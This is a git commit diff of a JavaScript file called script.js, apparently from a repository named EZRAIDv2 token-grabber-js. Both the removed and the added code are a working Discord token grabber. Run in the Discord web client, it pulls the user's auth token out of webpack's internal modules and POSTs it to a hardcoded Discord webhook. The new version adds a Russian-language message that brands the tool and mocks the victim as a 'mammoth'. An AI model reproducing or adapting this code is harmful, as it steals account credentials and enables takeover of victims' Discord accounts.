a04fb0ec8ded85ce5d262da882c0847d8011adf4
Akkid666 <colin.sunner@outlook.com>
2025-08-28 15:41:47 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,11 +1,15 @@
-function sendMessage() {
-    const request = new XMLHttpRequest();
-    request.open("POST", "https://discord.com/api/webhooks/1406635172753051791/5p3jhyc2fcweXJQWgqr44NCTnoRdasPV66XNirJuMyoTAlR3WJpMHYslgIutIj73WXQ0");
-    request.setRequestHeader('Content-type', 'application/json');
-    const params = {
-                  username: "Token Grabber",
-                  avatar_url: "",
-                  content: (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
-                   };
-    request.send(JSON.stringify(params));};
-sendMessage();
+
+function getToken(){
+    var webhook="https://discord.com/api/webhooks/1406635172753051791/5p3jhyc2fcweXJQWgqr44NCTnoRdasPV66XNirJuMyoTAlR3WJpMHYslgIutIj73WXQ0 :)"
+    var token=(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
+     var request = new XMLHttpRequest();
+     request.open("POST", webhook);
+     request.setRequestHeader('Content-type', 'application/json');
+     var params = {
+        username: "Токен граббер от EZRAIDv2",
+        avatar_url: "",
+        content: ":penguin: **EZRAIDv2 - Токен Граббер**\n**А вот и токен от :mammoth: подъехал!**\n:key: **Токен: **||`" + token + "`||\n:black_cat: **GitHub:** ||`https://github.com/EZRAIDv2/token-grabber-js`||\n:skull: **Сделал EZRAIDv2 ** :skeleton:"
+      }
+      request.send(JSON.stringify(params));
+}
+getToken()
